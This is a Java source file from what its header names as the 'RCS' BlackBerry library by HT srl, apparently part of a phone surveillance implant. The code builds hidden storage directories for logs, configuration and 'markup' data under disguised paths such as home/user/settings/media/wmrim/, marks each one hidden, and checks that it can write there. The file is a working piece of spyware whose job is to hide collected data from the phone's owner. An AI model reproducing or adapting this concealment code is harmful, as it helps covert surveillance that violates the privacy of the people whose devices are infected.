//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Path.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.fs;

import java.io.IOException;
import java.util.Enumeration;
import java.util.Random;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;
import javax.microedition.io.file.FileSystemRegistry;

import net.rim.device.api.system.RuntimeStore;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;

/**
 * The Class Path.
 */
public final class Path {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);
    //#endif

    public static final int SD = 0;
    public static final int USER = 1;

    public static final String[] USER_EXT_PATHS = {
            "home/user/settings/media/wmrim/", "home/user/settings/wmrim/",
            "home/user/wmrim/" };

    public static final String USER_BASE_PATH = "/store/";

    private static final String SD_BASE_PATH = "/SDCard/Blackberry/";

    /** The Constant LOG_DIR_BASE. */
    public static final String LOG_DIR_BASE = "ld";

    /** The Constant CONF_DIR. */
    public static final String CONF_DIR = "cdd/";

    public static final String DEBUG_DIR = "dwm/";

    /** The Constant MARKUP_DIR. */
    public static final String MARKUP_DIR = "msdd/";

    /** The Constant MARKUP_DIR. */
    public static final String UPLOAD_DIR = "";


    //public static final String LOG_PATH = SD_PATH;
    //#ifdef DEBUG
    private static boolean emitError = true;
    //#endif

    static PathConf conf;

    static class PathConf {
        public static final long GUID = 0x9f1576ec5c1a61b2L;

        boolean init;

        /** The Constant USER_PATH. */
        public String USER_PATH = USER_BASE_PATH + "wmrim/";
    }

    private static String USER() {
        if (!isInizialized()) {
            //#ifdef DEBUG
            debug.warn("USER not initialized");
            //#endif
            init();
        }

        //#ifdef DBC
        Check.ensures(!conf.USER_PATH.startsWith("file://"),
                "USER_PATH shouldn.t start with file:// : " + conf.USER_PATH);
        //#endif
        return conf.USER_PATH;
    }

    /**
     * Hidden.
     * 
     * @return the string
     */
    public static String hidden() {
        return conf.USER_PATH;
    }

    /**
     * Conf.
     * 
     * @return the string
     */
    public static String conf() {
        return hidden() + CONF_DIR;
    }

    /**
     * Markup.
     * 
     * @return the string
     */
    public static String markup() {
        return hidden() + MARKUP_DIR;
    }

    /**
     * Logs.
     * 
     * @return the string
     */
    public static String logs() {
        return hidden() + LOG_DIR_BASE;
    }

    public static String debug() {
        return hidden() + DEBUG_DIR ;
    }

    /**
     * Crea la directory specificata e la rende hidden. Non crea ricosivamente
     * le directory.
     * 
     * @param dirName
     *            nome della directory, deve finire con /
     * @return true, if successful
     */
    public static synchronized boolean createDirectory(final String dirName) {

        if (conf == null) {
            //#ifdef DEBUG
            debug.error("createDirectory, Not init: " + dirName);
            //#endif
            return false;
        }

        //#ifdef DBC
        Check.ensures(!dirName.startsWith("file://"),
                "dirName shouldn.t start with file:// : " + dirName);
        Check.ensures(dirName.endsWith("/"), "directory should end with /");
        //#endif

        FileConnection fconn = null;

        try {
            fconn = (FileConnection) Connector.open("file://" + dirName,
                    Connector.READ_WRITE);

            if (fconn.exists()) {
                return true;
            }

            fconn.mkdir();
            fconn.setHidden(true);

            //#ifdef DBC
            Check.ensures(fconn.exists(), "Couldn't create dir");
            //#endif

        } catch (final Exception e) {

            //#ifdef DEBUG
            if (emitError) {
                debug.error(dirName + " ex: " + e.toString());
            }
            //#endif
            return false;

        } finally {
            if (fconn != null) {
                try {
                    fconn.close();
                } catch (final IOException e) {
                    //#ifdef DEBUG
                    if (debug != null && emitError) {
                        debug.error(dirName + " ex: " + e.toString());
                    }
                    //#endif

                }
            }
        }

        return true;
    }

    public synchronized static boolean isInizialized() {
        return conf != null;
    }

    /**
     * Gets the roots.
     * 
     * @return the roots
     */
    public static Vector getRoots() {
        final Enumeration roots = FileSystemRegistry.listRoots();
        final Vector vector = new Vector();

        while (roots.hasMoreElements()) {
            final String root = (String) roots.nextElement();
            vector.addElement(root);

            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                //#ifdef DEBUG
                debug.info(root + " " + fc.availableSize());
                //#endif
            } catch (final Exception e) {
                //#ifdef DEBUG
                debug.error(root + " " + e);
                //#endif
                //e.printStackTrace();
            }
        }

        return vector;
    }

    /**
     * Checks if the SD is present.
     * 
     * @return true, if is SD present
     */
    public static boolean isSDAvailable() {

        if (Conf.SD_ENABLED) {
            final Enumeration roots = FileSystemRegistry.listRoots();

            while (roots.hasMoreElements()) {
                final String path = (String) roots.nextElement();

                if (path.indexOf("SDCard") >= 0) {
                    //#ifdef DEBUG
                    if (debug != null) {
                        debug.info("SDPresent FOUND: " + path);
                    }
                    //#endif
                    return true;
                } else {
                    //#ifdef DEBUG
                    if (debug != null) {
                        debug.trace("SDPresent NOT:" + path);
                    }
                    //#endif
                }
            }
        }

        return false;
    }

    /**
     * Crea le directory iniziali.
     * 
     * @param sd
     *            SD: crea su SD. USER: crea su flash
     * @return true se riesce a scrivere le directory, false altrimenti
     */
    public static boolean makeDirs() {

        init();
        conf.init = true;

        Path.getRoots();

        //boolean ret = true;
        final Random random = new Random();
        String base;
        String[] extPaths;

        base = Path.USER_BASE_PATH;
        extPaths = USER_EXT_PATHS;

        String chosenDir = null;
        boolean found = false;

        //#ifdef DEBUG
        emitError = false;
        //#endif

        for (int i = 0; !found && i < extPaths.length; i++) {
            final String ext = extPaths[i];
            chosenDir = base + ext;
            //#ifdef DEBUG
            debug.trace("try chosenDir: " + chosenDir);
            //#endif

            found = createDirectory(chosenDir);
            if (found) {
                // createDirectory(Path.SD() + Path.LOG_DIR);
                found &= createDirectory(chosenDir + Path.MARKUP_DIR);
                found &= createDirectory(chosenDir + Path.CONF_DIR);
                found &= createDirectory(chosenDir + Path.DEBUG_DIR);
                //found &= createDirectory(chosenDir + Path.UPLOAD_DIR);

                //found &= createDirectory(chosenDir);
                // createDirectory(Path.SD() + Path.LOG_DIR);
                //found &= createDirectory(chosenDir + Path.MARKUP_DIR);
                //found &= createDirectory(chosenDir + Path.CONF_DIR);

                final long rnd = Math.abs(random.nextLong());

                found &= createDirectory(chosenDir + rnd + "/");
                found &= removeDirectory(chosenDir + rnd + "/");
            }
        }

        //#ifdef DEBUG
        emitError = false;
        //#endif

        conf.USER_PATH = chosenDir;

        return found;
    }

    private synchronized static void init() {
        if (conf == null) {
            conf = (PathConf) RuntimeStore.getRuntimeStore().get(PathConf.GUID);
        }
        if (conf == null) {
            conf = new PathConf();
            RuntimeStore.getRuntimeStore().put(PathConf.GUID, conf);
        }
    }

    /**
     * Prints the roots.
     */
    public static void printRoots() {
        final Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            final String root = (String) roots.nextElement();
            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                System.out.println(root + " " + fc.availableSize());

            } catch (final IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Rimuove la directory specificata, solo se vuota.
     * 
     * @param dirName
     *            the dir name
     * @return true, if successful
     */
    public static boolean removeDirectory(final String dirName) {
        if (!isInizialized()) {
            //#ifdef DEBUG
            debug.error("removeDirectory: Not init");
            //#endif
            return false;
        }
        //#ifdef DBC
        Check.asserts(!dirName.startsWith("file://"),
                "dirName shouldn.t start with file:// : " + dirName);
        //#endif

        FileConnection fconn = null;
        try {
            fconn = (FileConnection) Connector.open("file://" + dirName,
                    Connector.READ_WRITE);

            if (!fconn.exists()) {
                //#ifdef DEBUG
                if (debug != null) {
                    debug.trace("Directory doesn't exists");
                }
                //#endif

                return false;
            }

            if (!fconn.list().hasMoreElements()) {
                fconn.delete();
            } else {
                //#ifdef DEBUG
                debug.info("directory not empty");
                //#endif
                return false;
            }

            //#ifdef DBC
            Check.ensures(!fconn.exists(), "Couldn't delete dir");
            //#endif

        } catch (final IOException e) {

            e.printStackTrace();
            return false;

        } finally {
            if (fconn != null) {
                try {
                    fconn.close();
                } catch (final IOException e) {
                    //#ifdef DEBUG
                    if (debug != null) {
                        debug.error(e.toString());
                    }
                    //#endif
                }
            }
        }
        return true;
    }

    private Path() {
    }

    public static long freeSpace(int sd) {
        try {
            if (sd == SD) {
                if (Path.isSDAvailable()) {
                    FileConnection conn;
                    conn = (FileConnection) Connector.open("file://"
                            + SD_BASE_PATH);
                    return conn.availableSize();
                }
            } else {
                FileConnection conn = (FileConnection) Connector.open("file://"
                        + USER_BASE_PATH);
                return conn.availableSize();

            }
        } catch (IOException ex) {
            //#ifdef DEBUG
            debug.error("freeSpace: " + ex);
            //#endif

            return -1;
        }

        return 0;
    }

    public static long totalSpace(int sd) {
        try {
            if (sd == SD) {
                if (Path.isSDAvailable()) {
                    FileConnection conn;
                    conn = (FileConnection) Connector.open("file://"
                            + SD_BASE_PATH);
                    return conn.availableSize();
                }
            } else {
                FileConnection conn = (FileConnection) Connector.open("file://"
                        + USER_BASE_PATH);
                return conn.totalSize();

            }
        } catch (IOException ex) {
            //#ifdef DEBUG
            debug.error("totalSpace: " + ex);
            //#endif

            return -1;
        }

        return 0;
    }


}
